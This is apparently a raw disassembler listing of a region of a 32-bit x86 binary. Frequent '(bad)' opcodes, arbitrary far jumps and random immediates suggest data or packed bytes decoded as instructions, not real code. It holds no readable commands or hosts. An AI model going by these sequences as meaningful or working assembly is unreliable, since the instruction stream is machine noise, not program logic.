  4253c2:	pop    esi
  4253c3:	mov    DWORD PTR [esi],esi
  4253c5:	ins    BYTE PTR es:[edi],dx
  4253c6:	(bad)
  4253ca:	adc    dh,BYTE PTR [ebp-0x4a]
  4253cd:	(bad)  
  4253ce:	mov    dl,0x5f
  4253d0:	cdq    
  4253d1:	call   0x64506cd0
  4253d6:	shl    ebx,cl
  4253d8:	mov    esi,0xc051ae89
  4253dd:	(bad)  
  4253de:	(bad)  
  4253df:	mov    ebp,0x3669e92a
  4253e4:	scas   al,BYTE PTR es:[edi]
  4253e5:	inc    esp
  4253e6:	arpl   WORD PTR [ebx+eiz*1+0x24721bb6],si
  4253ed:	rcl    DWORD PTR [ecx],0xc1
  4253f0:	mov    esi,0x4b92809e
  4253f5:	mov    ebp,0x554a458d
  4253fa:	repnz inc ebx
  4253fc:	fwait
  4253fd:	push   es
  4253fe:	and    eax,0x92a713e6
  425403:	sub    al,0x3a
  425405:	es test dh,dh
  425408:	xchg   edi,eax
  425409:	pop    ebp
  42540a:	int3   
  42540b:	jns    0x425433
  42540d:	or     edi,ebx
  42540f:	call   0x5ca2:0x6f2ecfeb
  425416:	sbb    ebp,edx
  425418:	popa   
  425419:	in     eax,0x29
  42541b:	dec    eax
  42541c:	loopne 0x42546c
  42541e:	dec    edi
  42541f:	mov    esi,0x320a6e06
  425424:	jge    0x42546d
  425426:	pop    esp
  425427:	lods   eax,DWORD PTR ds:[esi]
  425428:	push   ss
  425429:	or     dl,dl
  42542b:	retf   0xd4df
  42542e:	call   0xde203f4d
  425433:	in     al,dx
  425434:	xchg   ebp,eax
  425435:	jg     0x425487
  425437:	mov    edi,0x528b7470
  42543c:	add    al,0x78
  42543e:	xor    esp,esi
  425440:	shl    BYTE PTR [eax+eax*1+0x0],cl
	...
  4254b4:	loopne 0x425525
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	icebp  
  4254c1:	push   esp
  4254c2:	ja     0x4254c9
  4254c4:	mov    dh,0x8d
  4254c6:	add    DWORD PTR [eax],eax
  4254c8:	test   BYTE PTR [eax],0x0
  4254cb:	add    BYTE PTR [esi+esi*2+0x35871006],dl
  4254d2:	pop    ebx
  4254d4:	inc    BYTE PTR [ecx]
  4254d6:	int    0x67
  4254d8:	and    al,0x48
  4254da:	pop    edi
  4254db:	push   esp
  4254dc:	ss pop ebp
  4254de:	nop
  4254df:	iret   
  4254e0:	dec    esi
  4254e1:	dec    esp
  4254e2:	call   0x2407:0xf269f56e
  4254e9:	sub    DWORD PTR [edx+0x1d],ebp
  4254ec:	mov    esp,0xd3853227
  4254f1:	fiadd  WORD PTR [ebx]
  4254f3:	inc    eax
  4254f4:	imul   eax,DWORD PTR [edx+0x71],0x393037fc
  4254fb:	push   esp
  4254fc:	pusha  
  4254fd:	inc    edx
  4254fe:	repz cmp DWORD PTR [ecx-0x8898914],edx
  425505:	and    edx,DWORD PTR [edi+0x1adbf257]
  42550b:	stos   BYTE PTR es:[edi],al
  42550c:	dec    eax
  42550d:	ret    0x8770
  425510:	or     eax,0x4c4c8426
  425515:	(bad)  
  425517:	hlt    
  425518:	mov    eax,esi
  42551a:	jb     0x425517
  42551c:	ins    BYTE PTR es:[edi],dx
  42551d:	dec    edx
  42551e:	dec    edx
  42551f:	(bad)  
  425520:	imul   esp,DWORD PTR [eax+edx*8],0x8d15f9d5
  425527:	fild   WORD PTR [edi]
  425529:	mov    cl,0xdc
  42552b:	stos   BYTE PTR es:[edi],al
  42552c:	shr    ch,0x21
  42552f:	inc    edi
  425530:	shl    cl,0x5d
  425533:	jo     0x425515
  425535:	add    DWORD PTR cs:[eax],esi
  425538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425539:	inc    ebp
  42553a:	inc    esi
  42553b:	pop    eax
  42553c:	mov    eax,ds:0x3105ace9
  425541:	push   ds
  425542:	mov    esi,0x8afecc0
  425547:	sub    BYTE PTR [ebx+0x2d],0x1
  42554b:	cmp    BYTE PTR [edi],cl
  42554d:	jle    0x425545
  42554f:	ja     0x4255cb
  425551:	les    eax,FWORD PTR [ebx+eax*8]
  425554:	pop    ecx
  425555:	adc    BYTE PTR [edx],bl
  425557:	jmp    0xa2a162d6
  42555c:	loopne 0x4254ec
  42555e:	(bad)  
  42555f:	cs dec eax
  425561:	pushfw 
  425563:	xchg   edi,eax
  425564:	(bad)  
  425565:	cmp    al,0x50
  425567:	ja     0x42557e
  425569:	loope  0x42556d
  42556b:	ds in  al,dx
  42556d:	inc    ecx
  42556e:	outs   dx,DWORD PTR ds:[esi]
  42556f:	sub    BYTE PTR [edi],dl
  425571:	jg     0x425588
  425573:	jmp    0xe99c:0x2342b3c3
  42557a:	mov    ebp,0x250a2590
  42557f:	pop    ecx
  425580:	jge    0x425533
  425582:	xchg   esp,eax
  425583:	jne    0x425541
  425585:	xlat   BYTE PTR ds:[ebx]
  425586:	adc    eax,DWORD PTR [edx+ebx*8]
  425589:	fsubr  DWORD PTR [eax]
  42558b:	cs pop ss
  42558d:	sbb    DWORD PTR [ecx+eiz*4],esi
  425590:	jno    0x42555f
  425592:	mov    al,ds:0xdf6d9da8
  425597:	pop    ebp
  425598:	push   0xc53946a7
  42559d:	or     ah,BYTE PTR [ebx-0xbd8ca16]
  4255a3:	cwde   
  4255a4:	idiv   DWORD PTR [ebx]
  4255a6:	sbb    BYTE PTR [edi],cl
  4255a8:	dec    eax
  4255a9:	xchg   edi,eax
  4255aa:	dec    ecx
  4255ab:	jne    0x42554f
  4255ad:	cld    
  4255ae:	jnp    0x42553c
  4255b0:	in     eax,0x7f
  4255b2:	adc    al,0xab
  4255b4:	xchg   edx,eax
  4255b5:	sbb    eax,0xa66f9ce6
  4255ba:	or     bl,BYTE PTR [edi+0x64]
  4255bd:	mov    bh,0x17
  4255bf:	mov    WORD PTR [esi+0x8d],?
	...
  425631:	add    BYTE PTR [eax],al
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	xchg   ecx,eax
  425641:	cmp    DWORD PTR [eax+0x18eaca0],edx
  425647:	add    dh,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [eax+0x2151740e],dl
  425651:	push   0xd1deefca
  425656:	inc    eax
  425657:	push   esp
  425658:	sbb    eax,0x8a40ab05
  42565d:	stos   DWORD PTR es:[edi],eax
  42565e:	add    al,0x70
  425660:	xor    BYTE PTR [esi],0x2f
  425663:	adc    esp,esp
  425665:	nop
  425666:	adc    al,0x3f
  425668:	repz sbb eax,0x12ca6c2b
  42566e:	jo     0x425676
  425670:	gs xor ch,dh
  425673:	repz xlat BYTE PTR ds:[ebx]
  425675:	fwait
  425676:	mov    eax,ds:0x65894187
  42567b:	cmp    ch,cl
  42567d:	popf   
  42567e:	inc    ecx
  42567f:	or     esi,DWORD PTR [ebx+ebx*2+0x34]
  425683:	in     al,0xa5
  425685:	cwde   
  425686:	push   cs
  425687:	inc    esi
  425688:	(bad)  
  425689:	fild   WORD PTR [esi+0x1be771be]
  42568f:	mov    DWORD PTR ds:0xb6b65dcc,edx
  425695:	retf   
  425696:	add    eax,0xca425468
  42569b:	mov    eax,ds:0x65a1ece5
  4256a0:	out    dx,eax
  4256a1:	outs   dx,DWORD PTR ds:[esi]
  4256a2:	adc    edx,DWORD PTR [esi-0x48]
  4256a5:	fiadd  WORD PTR [eax+0x5c170ab4]
  4256ab:	gs sti 
  4256ad:	dec    esp
  4256ae:	(bad)  
  4256af:	push   ebp
  4256b0:	add    eax,0xadf189d2
  4256b5:	loope  0x425725
  4256b7:	aaa    
  4256b8:	retf   0x9002
  4256bb:	lea    edx,[esi]
  4256bd:	fdivr  QWORD PTR ds:0x10c302b7
  4256c3:	stos   BYTE PTR es:[edi],al
  4256c4:	xchg   esp,eax
  4256c5:	das    
  4256c6:	lea    ecx,[edi-0x59]
  4256c9:	(bad)  
  4256ca:	iret   
  4256cb:	pop    ecx
  4256cc:	jnp    0x425695
  4256ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256cf:	mov    bh,0xe3
  4256d1:	or     ebp,DWORD PTR ds:[ebx]
  4256d4:	in     al,dx
  4256d5:	push   ds
  4256d6:	aaa    
  4256d7:	mul    DWORD PTR [ebx+ecx*8+0x109e4245]
  4256de:	lds    esp,FWORD PTR [esi]
  4256e0:	push   0xe1c190c
  4256e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256e6:	sub    BYTE PTR [esi-0x1de390d5],al
  4256ec:	push   ss
  4256ed:	jmp    0x4256ab
  4256ef:	cmc    
  4256f0:	mov    ecx,fs
  4256f2:	cmp    BYTE PTR [edx-0xb2498a7],ah
  4256f8:	xor    ecx,esp
  4256fa:	add    DWORD PTR [ebp-0x126f3e9c],edi
  425700:	sbb    DWORD PTR [edi+0x88e28ae],0x62
  425707:	jbe    0x425787
  425709:	mov    eax,0xdeec401e
  42570e:	je     0x4256a1
  425710:	sbb    eax,0xe462b607
  425715:	out    dx,al
  425716:	adc    edi,DWORD PTR [edx-0x12]
  425719:	jns    0x4256dc
  42571b:	dec    esi
  42571c:	sub    DWORD PTR ds:0x380b96f3,esi
  425722:	lods   eax,DWORD PTR ds:[esi]
  425723:	jp     0x4256aa
  425725:	pop    esp
  425726:	mov    ds:0xc3779d1c,eax
  42572b:	xchg   esp,eax
  42572c:	jmp    0x7aa4:0x7630061f
  425733:	jb     0x4256cc
  425735:	sub    eax,0xaf23015f
  42573a:	inc    ebx
  42573b:	test   BYTE PTR [ebx+0x5b4c72ce],al
  425741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  4257b2:	add    BYTE PTR [eax],al
  4257b4:	and    bl,BYTE PTR [eax-0x7c]
  4257b7:	out    dx,eax
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	je     0x42580f
  4257c2:	xchg   esp,eax
  4257c3:	nop
  4257c4:	mov    ds:0xf600018f,al
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [ecx-0x3d570ae0],dl
  4257d1:	xchg   edx,eax
  4257d2:	xchg   ecx,eax
  4257d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257d4:	xor    BYTE PTR [ebx-0x3d],ch
  4257d7:	data16 ins BYTE PTR es:[edi],dx
  4257d9:	mov    ecx,0xcbdc8922
  4257de:	imul   ebx,DWORD PTR [edx+0x784d1383],0xd2dd3339
  4257e8:	xor    eax,0x19161218
  4257ed:	xchg   ebx,eax
  4257ee:	pop    edi
  4257ef:	inc    edx
  4257f0:	mov    DWORD PTR [eax-0x487c94ca],edi
  4257f6:	sbb    ch,BYTE PTR [edi+0x4e]
  4257f9:	data16 (bad) 
  4257fb:	cli    
  4257fc:	ins    BYTE PTR es:[edi],dx
  4257fd:	and    al,0xf
  4257ff:	scas   al,BYTE PTR es:[edi]
  425800:	out    0xe1,al
  425802:	and    DWORD PTR [esi],ecx
  425804:	and    ch,BYTE PTR [eax-0x69f6f1d5]
  42580a:	arpl   bp,dx
  42580c:	adc    eax,0x9cd6915
  425811:	outs   dx,DWORD PTR ds:[esi]
  425812:	xchg   edx,eax
  425813:	lock pushf 
  425815:	bound  ebx,QWORD PTR [eax]
  425817:	daa    
  425818:	scas   al,BYTE PTR es:[edi]
  425819:	jmp    0x64e9cfb8
  42581e:	fidiv  WORD PTR [ebx]
  425820:	sbb    cl,BYTE PTR [edi]
  425822:	jns    0x4257c5
  425824:	or     BYTE PTR [edx-0x79abccd4],0xa2
  42582b:	jne    0x4258aa
  42582d:	push   edx
  42582e:	repz les edi,FWORD PTR [ecx]
  425831:	cmp    ebp,edx
  425833:	rol    ebx,0x1f
  425836:	mov    esi,0x4a26e162
  42583b:	jmp    0x4257ee
  42583d:	sbb    BYTE PTR [edx+0x3c],ah
  425840:	jmp    0x4f6:0xe84aa934
  425847:	iret   
  425848:	add    BYTE PTR [esi-0x2],ah
  42584b:	(bad)  
  42584c:	mov    esi,0x4250cf92
  425851:	xor    ebx,DWORD PTR [ebx-0x2d]
  425854:	(bad)  
  425855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425856:	call   0x4a1a815a
  42585b:	inc    ebp
  42585c:	sar    BYTE PTR [ebp+0x73],1
  42585f:	mov    edx,gs
  425861:	mov    esp,0xfe2d4d81
  425866:	outs   dx,BYTE PTR ds:[esi]
  425867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425868:	mov    bh,0x66
  42586a:	push   esp
  42586b:	push   ss
  42586c:	sub    al,0x8d
  42586e:	pushf  
  42586f:	pop    esp
  425870:	pop    edx
  425871:	repnz xchg esp,eax
  425873:	loope  0x425835
  425875:	push   ds
  425876:	out    dx,al
  425877:	mov    bh,0xb2
  425879:	and    BYTE PTR [edi-0x1c],dl
  42587c:	cmp    ebx,edx
  42587e:	ror    BYTE PTR [edx+0x16d369c6],1
  425884:	stc    
  425885:	pop    edx
  425886:	jbe    0x42587c
  425888:	and    al,0xf1
  42588a:	nop
  42588b:	cld    
  42588c:	shl    BYTE PTR [ecx+0x19f27a13],0x6d
  425893:	fcmovnbe st,st(5)
  425895:	imul   DWORD PTR [edx+0x9]
  425898:	jmp    0x4258f0
  42589a:	fidiv  DWORD PTR ds:0x2361c6da
  4258a0:	(bad)  
  4258a1:	in     eax,0xa9
  4258a3:	fiadd  WORD PTR [ecx]
  4258a5:	inc    ebx
  4258a6:	pop    esi
  4258a7:	push   ebp
  4258a8:	mov    ds:0x8d2153d9,eax
  4258ad:	popa   
  4258ae:	imul   esp,DWORD PTR [ebx+0x3dfacb0d],0xffffffbe
  4258b5:	dec    edi
  4258b6:	out    dx,eax
  4258b7:	js     0x425913
  4258b9:	jl     0x4258d7
  4258bb:	stos   BYTE PTR es:[edi],al
  4258bc:	loop   0x425931
  4258be:	mov    ebx,0xe673c
	...
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	rcl    ch,1
  425942:	or     edi,DWORD PTR [edx-0x68]
  425945:	nop
  425946:	add    DWORD PTR [eax],eax
  425948:	test   BYTE PTR [eax],0x0
  42594b:	add    BYTE PTR [eax-0x4e385de7],bh
  425951:	or     bh,al
  425953:	stc    
  425954:	iret   
  425955:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425956:	push   ebx
  425957:	push   edi
  425958:	sbb    al,0xc0
  42595a:	scas   al,BYTE PTR es:[edi]
  42595b:	or     al,0xf3
  42595d:	mov    ds:0xbae7d84b,eax
  425962:	imul   esi,DWORD PTR [esi-0x692f4ff7],0xffffffe2
  425969:	into   
  42596a:	xchg   ebx,eax
  42596b:	fldlg2 
  42596d:	fsubr  QWORD PTR [edi-0x1]
  425970:	aas    
  425971:	xchg   ebp,eax
  425972:	das    
  425973:	sbb    DWORD PTR fs:[edi-0x77],edi
  425977:	call   0xf5b615af
  42597c:	mov    BYTE PTR [eax],bl
  42597e:	adc    BYTE PTR [esi+0x76],bh
  425981:	xor    al,0xc4
  425983:	jp     0x4259a4
  425985:	add    DWORD PTR [eax-0x71],edx
  425988:	lods   al,BYTE PTR ds:[esi]
  425989:	pushf  
  42598a:	add    BYTE PTR [ebx+0x1a],al
  42598d:	dec    esp
  42598e:	adc    eax,0xa8ab039b
  425993:	clc    
  425994:	sbb    DWORD PTR [edi+esi*2-0x7b],0xd70b7233
  42599c:	scas   eax,DWORD PTR es:[edi]
  42599d:	dec    ebp
  42599e:	int3   
  42599f:	push   cs
  4259a0:	call   0xb442a926
  4259a5:	mov    al,ds:0xa914096d
  4259aa:	cmp    dh,BYTE PTR [eax+0x2a]
  4259ad:	rol    BYTE PTR [ebx-0x42],1
  4259b0:	pop    esi
  4259b1:	into   
  4259b2:	xor    eax,0x1391ca23
  4259b7:	loop   0x4259fe
  4259b9:	call   DWORD PTR es:[ecx+0x68]
  4259bd:	popf   
  4259be:	mov    edi,0xb57d1080
  4259c3:	ret    0x83b0
  4259c6:	push   0xffffffd9
  4259c8:	dec    esp
  4259c9:	ins    DWORD PTR es:[edi],dx
  4259ca:	sub    DWORD PTR [ebp+0x3b],ecx
  4259cd:	nop
  4259ce:	lahf   
  4259cf:	leave  
  4259d0:	push   cs
  4259d1:	jno    0x4259e7
  4259d3:	imul   esi,DWORD PTR [eax+0xe],0xffffff9b
  4259d7:	jge    0x4259c5
  4259d9:	jge    0x425986
  4259db:	outs   dx,BYTE PTR ds:[esi]
  4259dc:	push   ebx
  4259dd:	inc    edx
  4259de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4259df:	call   0xa9ef:0x5d132a77
  4259e6:	data16 or BYTE PTR [ebp-0x7e2faf0e],dh
  4259ed:	test   eax,0x68b117db
  4259f2:	push   0x34eba404
  4259f7:	call   0xf1aa9f2d
  4259fc:	je     0x425a3a
  4259fe:	clc    
  4259ff:	shr    DWORD PTR [ecx+eax*1],0x4b
  425a03:	call   0xc6f3c123
  425a08:	push   ss
  425a09:	adc    al,0xd1
  425a0b:	mov    cl,0xf1
  425a0d:	push   0x70
  425a0f:	mov    edx,esi
  425a11:	icebp  
  425a12:	mov    ah,bh
  425a14:	fnstsw WORD PTR [ebx+ebx*4-0x48]
  425a18:	xchg   ecx,eax
  425a1a:	dec    ebp
  425a1b:	pop    esp
  425a1c:	retf   0xa874
  425a1f:	outs   dx,BYTE PTR ds:[esi]
  425a20:	out    0xab,eax
  425a22:	(bad)
  425a25:	and    eax,DWORD PTR [ebx-0x1141d3d8]
  425a2b:	jmp    0xeaec244b
  425a30:	push   esp
  425a31:	shr    edi,1
  425a33:	xchg   DWORD PTR [esi+ecx*1],ebx
  425a36:	adc    al,0x97
  425a38:	fiadd  WORD PTR [edx+0x2b]
  425a3b:	punpckldq mm6,mm2
  425a3e:	les    ecx,FWORD PTR ds:0x43bb
	...
  425ab4:	push   es
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	jecxz  0x425b3d
  425ac2:	xchg   ebx,eax
  425ac3:	dec    ecx
  425ac4:	mov    ss,WORD PTR [ecx+0xf60001]
  425aca:	add    BYTE PTR [eax],al
  425acc:	mov    ah,0x84
  425ace:	mov    ds:0x2620862e,eax
  425ad3:	mov    al,0x8a
  425ad5:	sub    dh,ah
  425ad7:	cld    
  425ad8:	(bad)  
  425ad9:	idiv   al
  425adb:	xor    BYTE PTR [esp+edi*2+0x5bda4c4e],dl
  425ae2:	(bad)  
  425ae3:	sbb    BYTE PTR [ebx],ah
  425ae5:	stc    
  425ae6:	(bad)  
  425ae7:	jge    0x425af1
  425ae9:	mov    DWORD PTR [ebp+0x17c2605c],edi
  425aef:	xor    eax,0xa37c1b61
  425af4:	mov    ecx,0x1c1c4190
  425af9:	mov    eax,0x5f53e271
  425afe:	pusha  
  425aff:	dec    edx
  425b00:	leave  
  425b01:	dec    esi
  425b02:	lods   al,BYTE PTR ds:[esi]
  425b03:	push   edx
  425b04:	inc    edx
  425b05:	jns    0x425b5c
  425b07:	mov    bh,0xf5
  425b09:	imul   esp,DWORD PTR [ebx+ecx*1-0x1ec40e32],0x79675438
  425b14:	arpl   bx,bx
  425b16:	pop    ss
  425b17:	fistp  WORD PTR [edx+0x45]
  425b1a:	into   
  425b1b:	mov    cl,0x9e
  425b1d:	mov    eax,ds:0xc29c4104
  425b22:	jae    0x425b3f
  425b24:	ins    DWORD PTR es:[edi],dx
  425b25:	jne    0x425ad6
  425b27:	mov    ds:0xc0f6a6c6,eax
  425b2c:	push   ebx
  425b2d:	xor    DWORD PTR [esi+0x7b],esp
  425b30:	or     ebp,DWORD PTR [edx+0x2792ce5a]
  425b36:	xor    BYTE PTR [edi-0x5],ch
  425b39:	xor    eax,0xb53dd9b8
  425b3e:	shr    ch,cl
  425b40:	sbb    BYTE PTR [edx],ch
  425b42:	jg     0x425af0
  425b44:	lods   al,BYTE PTR ds:[esi]
  425b45:	mov    ebx,0x876ab9bb
  425b4a:	mov    ecx,0x80cbda07
  425b4f:	xchg   esi,eax
  425b50:	in     eax,0xec
  425b52:	sbb    al,0x67
  425b54:	sbb    al,0xc6
  425b56:	cwde   
  425b57:	and    al,0x69
  425b5a:	je     0x425b30
  425b5c:	ret    0xcc3
  425b5f:	add    esp,ecx
  425b61:	in     eax,dx
  425b62:	cli    
  425b63:	add    DWORD PTR [esi],esi
  425b65:	outs   dx,BYTE PTR ds:[esi]
  425b66:	bound  esi,QWORD PTR [ebx+esi*1]
  425b69:	scas   eax,DWORD PTR es:[edi]
  425b6a:	sahf   
  425b6b:	int3   
  425b6c:	(bad)
  425b70:	lods   al,BYTE PTR ds:[esi]
  425b71:	add    ebx,0xffffffda
  425b74:	in     ax,0xa3
  425b77:	inc    esi
  425b78:	ret    
  425b79:	(bad)  
  425b7a:	(bad)  
  425b7b:	pusha  
  425b7c:	sub    DWORD PTR [edx-0x67],0x14
  425b80:	je     0x425b7f
  425b82:	fs cmp al,0xd4
  425b85:	rcr    DWORD PTR [ebx+0x3],0x87
  425b89:	mov    al,ds:0xe588e99e
  425b8e:	mov    ebx,0xb4562b3b
  425b93:	xor    esi,ebx
  425b95:	in     al,0x8
  425b97:	push   0xe957954b
  425b9c:	jbe    0x425b9b
  425b9e:	mul    dh
  425ba0:	jmp    0x425b6a
  425ba2:	jge    0x425b28
  425ba4:	fldcw  WORD PTR [esi-0x21]
  425ba7:	or     BYTE PTR [ebx+eax*1+0x6],bh
  425bab:	fnstcw WORD PTR [esi+0x724dfa38]
  425bb1:	outs   dx,DWORD PTR ds:[esi]
  425bb2:	push   ecx
  425bb3:	cmp    BYTE PTR [ebx],0x1e
  425bb6:	jo     0x425bce
  425bb8:	rcr    DWORD PTR [edi*1-0x234e9dd4],cl
  425bbf:	test   BYTE PTR [ecx+ecx*8],dl
	...
  425c32:	add    BYTE PTR [eax],al
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x9284:0x11b19ee0
  425c46:	add    DWORD PTR [eax],eax
  425c48:	test   BYTE PTR [eax],0x0
  425c4b:	add    BYTE PTR [eax],cl
  425c4d:	(bad)  [ecx+0x52a2b074]
  425c53:	cld    
  425c54:	mov    edi,0x824a551b
  425c59:	and    DWORD PTR [edx-0x49ede0d7],ecx
  425c5f:	and    cl,BYTE PTR [esi-0x64312f33]
  425c65:	lods   eax,DWORD PTR ds:[esi]
  425c66:	push   esp
  425c67:	daa    
  425c68:	xor    DWORD PTR [edi+0xe],edx
  425c6b:	mov    edi,0x5898255a
  425c70:	dec    esp
  425c71:	or     DWORD PTR [ecx+0x13],edx
  425c74:	std    
  425c75:	loopne 0x425c7a
  425c77:	push   ebx
  425c78:	arpl   WORD PTR ss:[ecx+0x5cb68668],dx
  425c7f:	pop    edx
  425c80:	xchg   edi,eax
  425c81:	dec    edx
  425c82:	jne    0x425ce6
  425c84:	jmp    0x47e3ecbb
  425c89:	adc    eax,0xde5eb92d
  425c8e:	pop    ebp
  425c8f:	xor    al,BYTE PTR [ebx+0x46]
  425c92:	xchg   edi,eax
  425c93:	push   0xffffffab
  425c95:	mov    dh,0xe0
  425c97:	cld    
  425c98:	adc    al,dl
  425c9a:	dec    eax
  425c9b:	je     0x425c35
  425c9d:	sub    al,BYTE PTR [edi-0x6715e580]
  425ca3:	push   ebx
  425ca4:	out    0xb5,eax
  425ca6:	xchg   esp,eax
  425ca7:	mov    ?,WORD PTR [ebx+esi*1]
  425caa:	test   BYTE PTR [eax-0x331ae623],dh
  425cb0:	ds xchg edx,eax
  425cb2:	push   edi
  425cb3:	jecxz  0x425ce8
  425cb5:	cmp    eax,0x55a9cf03
  425cba:	lds    edx,FWORD PTR [edi+ebp*8]
  425cbd:	mov    edx,0xcc90a332
  425cc2:	jge    0x425c5e
  425cc4:	es (bad) 
  425cc6:	(bad)  
  425cc7:	in     eax,dx
  425cc8:	xchg   dl,al
  425cca:	cmp    BYTE PTR [edi+0x75],cl
  425ccd:	jl     0x425cac
  425ccf:	xor    eax,0xb2727702
  425cd4:	inc    ecx
  425cd5:	repz jnp 0x425c9c
  425cd8:	cmc    
  425cd9:	and    ebx,esi
  425cdb:	add    BYTE PTR [ecx],al
  425cdd:	sub    ecx,DWORD PTR [ebx-0x30]
  425ce0:	jge    0x425cee
  425ce2:	mov    bl,0xf3
  425ce4:	push   ss
  425ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ce6:	xor    DWORD PTR [eax+eiz*1-0x6dc03976],esp
  425ced:	ror    DWORD PTR [esi+0xf],1
  425cf0:	add    al,0xa8
  425cf2:	mov    bl,0xef
  425cf4:	stos   DWORD PTR es:[edi],eax
  425cf5:	mov    ebx,0xd60ce2d5
  425cfa:	jb     0x425cf5
  425cfc:	(bad)  
  425cfd:	(bad)  
  425cfe:	fs and ebp,edx
  425d01:	pop    ebp
  425d02:	mov    DWORD PTR [ecx],edi
  425d04:	aaa    
  425d05:	jo     0x425d80
  425d07:	cli    
  425d08:	ret    
  425d09:	arpl   ax,bp
  425d0b:	mov    bl,0xc3
  425d0d:	inc    ebp
  425d0e:	sub    al,0xb8
  425d10:	neg    BYTE PTR [ecx+0x72a06f29]
  425d16:	jecxz  0x425ce2
  425d18:	mov    eax,esp
  425d1a:	cmp    al,cl
  425d1c:	xchg   DWORD PTR [ecx-0x41],edx
  425d1f:	mov    eax,fs
  425d21:	test   BYTE PTR [edi+0x5111577f],dh
  425d27:	retf   
  425d28:	jbe    0x425ccc
  425d2a:	call   0x3ebf86fa
  425d2f:	push   ss
  425d30:	gs mov ch,0xa1
  425d33:	mov    ch,0xd
  425d35:	cmp    al,0x81
  425d37:	loope  0x425cd8
  425d39:	fcom   QWORD PTR [esi-0x41e2b375]
  425d3f:	sbb    ch,BYTE PTR [eax+0x75]
	...
  425db2:	add    BYTE PTR [eax],al
  425db4:	cmp    eax,0xf361d20c
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	into   
  425dc1:	mov    ecx,0x937a9fa1
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	test   BYTE PTR [eax],0x0
  425dcb:	add    dh,bh
  425dcd:	jne    0x425dc3
  425dcf:	mov    edi,0x6f3e3f35
  425dd4:	push   0x6c1bb84e
  425dd9:	add    BYTE PTR [ebx-0xd26358b],cl
  425ddf:	cmc    
  425de0:	enter  0x12a0,0x69
  425de4:	xor    DWORD PTR [ebx+ecx*4+0x2cf9ce2c],eax
  425deb:	icebp  
  425dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425ded:	outs   dx,BYTE PTR ds:[esi]
  425dee:	mov    al,ds:0xb0ef9368
  425df3:	mov    ds:0x15a6efa7,eax
  425df8:	jmp    0x226ba49a
  425dfd:	jbe    0x425df9
  425dff:	test   al,0x16
  425e01:	push   es
  425e02:	pop    ebx
  425e03:	and    cl,BYTE PTR [edi-0x14803a72]
  425e09:	mov    edi,0xa35153b1
  425e0e:	xor    BYTE PTR [ebx-0x6acc03c8],ah
  425e14:	aad    0x14
  425e16:	mov    bl,0x1b
  425e18:	jne    0x425dc1
  425e1a:	mov    edi,0xe1de87d3
  425e1f:	mov    edi,ebp
  425e21:	jne    0x425e04
  425e23:	inc    ebp
  425e24:	fs (bad) 
  425e26:	jns    0x425e89
  425e28:	lahf   
  425e29:	sub    eax,0x492d3958
  425e2e:	mov    ds:0xa8fd7d1d,eax
  425e33:	sbb    bh,BYTE PTR [edi-0x1a]
  425e36:	push   ds
  425e37:	or     al,0xfa
  425e39:	jl     0x425ea9
  425e3b:	and    ch,BYTE PTR [ebx]
  425e3d:	das    
  425e3e:	jle    0x425dcd
  425e40:	adc    DWORD PTR [esp+eax*1+0x76],ebp
  425e44:	jecxz  0x425ebc
  425e46:	dec    esp
  425e47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425e48:	mov    esp,0x98ce00e7
  425e4d:	adc    dl,cl
  425e4f:	scas   eax,DWORD PTR es:[edi]
  425e50:	ss pop ebp
  425e52:	mov    ds:0x872ae7e0,eax
  425e57:	push   cs
  425e58:	faddp  st(5),st
  425e5a:	sub    ebx,DWORD PTR [edx-0x45]
  425e5d:	sbb    dh,BYTE PTR [edi+0x76]
  425e60:	(bad)  
  425e62:	(bad)  
  425e63:	sub    eax,0x1fc8bcc7
  425e68:	add    eax,DWORD PTR [ebp+0x34a2122a]
  425e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425e6f:	test   DWORD PTR [ecx-0x7f],ecx
  425e72:	pusha  
  425e73:	jmp    0x425e35
  425e75:	mov    ah,0x4d
  425e77:	push   eax
  425e78:	out    0xfb,eax
  425e7a:	pop    esi
  425e7b:	mov    ebp,0xd57ff790
  425e80:	xchg   BYTE PTR [ebx-0x31c03635],bl
  425e86:	jl     0x425eae
  425e88:	jno    0x425e6a
  425e8a:	test   eax,0x883f8c6b
  425e8f:	jnp    0x425ea6
  425e91:	les    ecx,FWORD PTR ds:0x5943e2e2
  425e97:	fiadd  DWORD PTR [edx-0x38]
  425e9a:	inc    edx
  425e9b:	repnz cmp esi,ebp
